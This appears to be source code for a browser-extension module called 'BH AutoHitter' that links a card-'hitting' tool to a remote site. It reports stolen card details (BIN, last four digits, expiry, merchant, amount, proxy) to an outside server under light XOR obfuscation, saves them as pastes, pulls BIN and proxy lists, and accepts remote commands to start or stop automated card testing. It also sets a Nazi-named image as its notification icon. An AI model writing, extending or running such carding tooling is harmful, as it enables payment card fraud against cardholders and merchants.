/**
 * BH AutoHitter Web Integration Module for Skybin
 * For personal use only - NOT for commercial purposes
 * 
 * This module bridges the BH AutoHitter Chrome extension with your Skybin website
 */

class BHWebIntegration {
    constructor(config = {}) {
        this.baseUrl = config.baseUrl || 'https://nullme.lol';
        this.apiEndpoint = config.apiEndpoint || '/api/bh-integration';
        this.authToken = config.authToken || this.generateToken();
        this.encryptionKey = config.encryptionKey || this.generateKey();
    }

    /**
     * Generate unique authentication token
     */
    generateToken() {
        return 'bh_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    /**
     * Generate encryption key for sensitive data
     */
    generateKey() {
        const array = new Uint8Array(32);
        crypto.getRandomValues(array);
        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
    }

    /**
     * Encrypt sensitive data before transmission
     */
    encryptData(data) {
        // Simple XOR encryption for personal use
        const key = this.encryptionKey;
        let encrypted = '';
        for (let i = 0; i < data.length; i++) {
            encrypted += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
        }
        return btoa(encrypted);
    }

    /**
     * Send hit data to Skybin
     */
    async sendHitToSkybin(hitData) {
        try {
            const payload = {
                timestamp: Date.now(),
                type: 'bh_hit',
                data: this.encryptData(JSON.stringify({
                    cardInfo: {
                        bin: hitData.bin,
                        last4: hitData.last4,
                        exp: hitData.exp,
                        type: hitData.cardType
                    },
                    result: hitData.result,
                    merchant: hitData.merchant,
                    amount: hitData.amount,
                    proxy: hitData.proxy,
                    userAgent: navigator.userAgent,
                    sessionId: hitData.sessionId
                })),
                auth: this.authToken
            };

            const response = await fetch(`${this.baseUrl}${this.apiEndpoint}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-BH-Auth': this.authToken
                },
                body: JSON.stringify(payload)
            });

            return await response.json();
        } catch (error) {
            console.error('Failed to send hit to Skybin:', error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Create paste for successful hit
     */
    async createHitPaste(hitData) {
        try {
            const pasteContent = this.formatHitForPaste(hitData);
            
            const response = await fetch(`${this.baseUrl}/api/paste`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    title: `BH Hit - ${hitData.merchant} - ${new Date().toISOString()}`,
                    content: pasteContent,
                    syntax: 'json',
                    visibility: 'private',
                    tags: ['bh_hit', 'payment', hitData.result],
                    metadata: {
                        source: 'bh_autohitter',
                        timestamp: Date.now()
                    }
                })
            });

            const result = await response.json();
            return {
                success: true,
                pasteUrl: `${this.baseUrl}/paste/${result.id}`,
                deleteToken: result.deleteToken
            };
        } catch (error) {
            console.error('Failed to create paste:', error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Format hit data for paste
     */
    formatHitForPaste(hitData) {
        return `=== BH AutoHitter Result ===
Time: ${new Date().toISOString()}
Merchant: ${hitData.merchant}
Amount: ${hitData.amount}

Card Information:
- BIN: ${hitData.bin}
- Last 4: ${hitData.last4}
- Exp: ${hitData.exp}
- Type: ${hitData.cardType}

Result: ${hitData.result}
Message: ${hitData.message}

Technical Details:
- Proxy: ${hitData.proxy || 'Direct'}
- Session: ${hitData.sessionId}
- Processing Time: ${hitData.processingTime}ms

${hitData.additionalInfo || ''}
`;
    }

    /**
     * Fetch configuration from Skybin
     */
    async fetchConfiguration() {
        try {
            const response = await fetch(`${this.baseUrl}/api/bh-config`, {
                headers: {
                    'X-BH-Auth': this.authToken
                }
            });

            if (response.ok) {
                const config = await response.json();
                return {
                    success: true,
                    config: {
                        bins: config.bins || [],
                        proxies: config.proxies || [],
                        settings: config.settings || {},
                        telegramConfig: config.telegram || {}
                    }
                };
            }
            return { success: false, error: 'Failed to fetch config' };
        } catch (error) {
            console.error('Failed to fetch configuration:', error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Stream hits in real-time via WebSocket
     */
    connectWebSocket() {
        const wsUrl = this.baseUrl.replace('https://', 'wss://').replace('http://', 'ws://');
        this.ws = new WebSocket(`${wsUrl}/api/ws/bh-hits`);

        this.ws.onopen = () => {
            console.log('Connected to Skybin WebSocket');
            this.ws.send(JSON.stringify({
                type: 'auth',
                token: this.authToken
            }));
        };

        this.ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            this.handleWebSocketMessage(data);
        };

        this.ws.onerror = (error) => {
            console.error('WebSocket error:', error);
        };

        this.ws.onclose = () => {
            console.log('WebSocket connection closed');
            // Reconnect after 5 seconds
            setTimeout(() => this.connectWebSocket(), 5000);
        };
    }

    /**
     * Handle incoming WebSocket messages
     */
    handleWebSocketMessage(data) {
        switch (data.type) {
            case 'config_update':
                this.handleConfigUpdate(data.config);
                break;
            case 'command':
                this.handleRemoteCommand(data.command);
                break;
            case 'notification':
                this.showNotification(data.message);
                break;
            default:
                console.log('Unknown message type:', data.type);
        }
    }

    /**
     * Handle configuration updates from server
     */
    handleConfigUpdate(config) {
        // Update local storage with new config
        chrome.storage.local.set({
            bhWebConfig: config,
            lastConfigUpdate: Date.now()
        });
        console.log('Configuration updated from server');
    }

    /**
     * Handle remote commands
     */
    handleRemoteCommand(command) {
        switch (command.action) {
            case 'start_hitting':
                this.startAutohit(command.params);
                break;
            case 'stop_hitting':
                this.stopAutohit();
                break;
            case 'update_bins':
                this.updateBins(command.bins);
                break;
            case 'update_proxies':
                this.updateProxies(command.proxies);
                break;
        }
    }

    /**
     * Show browser notification
     */
    showNotification(message) {
        if (Notification.permission === 'granted') {
            new Notification('BH AutoHitter', {
                body: message,
                icon: '/assets/images/Nazi.png'
            });
        }
    }

    /**
     * Initialize integration
     */
    async init() {
        // Request notification permission
        if (Notification.permission === 'default') {
            await Notification.requestPermission();
        }

        // Connect WebSocket
        this.connectWebSocket();

        // Fetch initial configuration
        const configResult = await this.fetchConfiguration();
        if (configResult.success) {
            console.log('BH Web Integration initialized successfully');
            return configResult.config;
        }

        return null;
    }
}

// Export for use in Chrome extension
if (typeof module !== 'undefined' && module.exports) {
    module.exports = BHWebIntegration;
} else {
    window.BHWebIntegration = BHWebIntegration;
}